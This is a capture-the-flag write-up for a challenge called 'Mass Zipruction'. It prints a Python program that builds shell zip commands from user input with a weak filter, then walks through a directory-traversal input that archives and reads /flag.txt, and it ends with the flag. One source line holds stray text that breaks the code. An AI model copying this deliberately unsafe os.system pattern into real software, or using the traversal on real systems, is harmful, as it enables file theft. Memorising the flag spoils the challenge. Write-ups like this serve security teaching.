# Mass Zipruction

**Difficulty:** Easy
**Category:** Misc
**Source Code:** Available
**Author:** 0utc4st
**Description:** A single spark can ignite a wildfire

## Source Code

```python
import os
import zipfile
import re

def create_book(filename):
    if re.search(r'[;|&.$(){}/]', filename):
        return "\nInvalid filename"
    if not os.path.exists("books"):
        os.makedirs("books")
    filename = filename+'.txt'
    with open(os.path.join("books", filename), "w") as f:
        f.write("")
    return f"\nBook '{filename}' created successfully in the 'books' directory"

def check_stock():
    book_files = os.listdir("books")
    return f"\nStock information: Total books in stock: {len(book_files)}"

def write_to_book(filename, content):
    if re.search(r'[;|&.$(){}/]', filename):
        return "\nInvalid filename"
    with open(os.path.join("books", filename+'.txt'), "a") as f:
        f.write(content + "\n")
    return f"\nContent added to book '{filename}.txt'"

def read_book(filename):
    if re.search(r'[;|&.$(){}/]', filename):
        return "\nInvalid filename"
    try:
        with open(f"./books/{filename}.txt" ,"r") as f:
            content = f.read()
        return "\n"+content
    except FileNotFoundError:
        return f"\nBook '{filename}.txt' not found"

def archive_files(filename,dest):
    if re.search(r'[;|&$(){}]', filename):
        return "\nInvalid filename"
    os.system(f"zip -j books/{dest}.zip books/{filename}")
    return f"\nFiles archived successfully as {dest}.zip"

def unzip_archives(filename):
    if re.search(r'[;|&$(){}]', filename):
        return "\nInvalid filename"
    os.system(f"unzip books/{filename}.zip -d books/")
    return "\nFiles extracted successfully"

def list_files():
    books_directory = os.listdir("books")
    return "\n".join(books_directory)

def main():
    while True:
        print("\n\nOptions:")
        print("1. Create a book")
        print("2. Check stock")
        print("3. Write to book")
        print("4. Read book")
        print("5. Archive files")
        print("6. Unzip archives")
        print("7. List files")
        print("8. Exit")
        choice = input("Enter your choice: ")
        if choice == '1':
            filename = input("Enter filename for the book: ")
            response = create_book(filename)
        elif choice == '2':
            response = check_stock()
        elif choice == '3':
            filename = input("Enter filename to write to: ")
            content = input("Enter content to write to the book: ")
            response = write_to_book(filename, content)
        elif choice == '4':
            filename = input("Enter filename to read: ")
            response = read_book(filename)
        elif choice == '5':
            filename = input("Enter filename to archive: ")
            dest= input("Enter destination archive name: ")
            response = archive_files(filename,dest)
        elif choice == '6':Archive files
            filename = input("Enter filename to unzip: ")
            response = unzip_archives(filename)
        elif choice == '7':
            response = list_files()
        elif choice == '8':
            print("\nExiting the program.")
            break
        else:
            response = "\nInvalid choice"
        print(response)

if __name__ == "__main__":
    main()
```

## Solution

we see that the 5th option `Archive files` is not properly sanitizing the file name :

```python
def archive_files(filename,dest):
    if re.search(r'[;|&$(){}]', filename):
        return "\nInvalid filename"
    os.system(f"zip -j books/{dest}.zip books/{filename}")
    return f"\nFiles archived successfully as {dest}.zip"
```

which means we can inject malicious characters to perform a directory traversal and zip the flag which is in `/flag.txt`, then unzip it with the 6th option and read it's content.

let's do that, first we inject our directory traversal payload :

```plaintext
Enter your choice: 5
Enter filename to archive: ../../../flag.txt
Enter destination archive name: flag
updating: flag.txt (stored 0%)

Files archived successfully as flag.zip
```

we list the files with the 7th option to make sure the zip file exists :

```plaintext
Enter your choice: 7
flag.zip
```

now let's extract it :

```plaintext
Enter your choice: 6
Enter filename to unzip: flag
Archive:  books/flag.zip
 extracting: books/flag.txt

Files extracted successfully
```

now we read the flag :

```plaintext
Enter your choice: 4
Enter filename to read: flag

nexus{Z1p_1s_4_Bl3$$1ng_4nd_4_Cur$3}
```

## Flag

`nexus{Z1p_1s_4_Bl3$$1ng_4nd_4_Cur$3}`
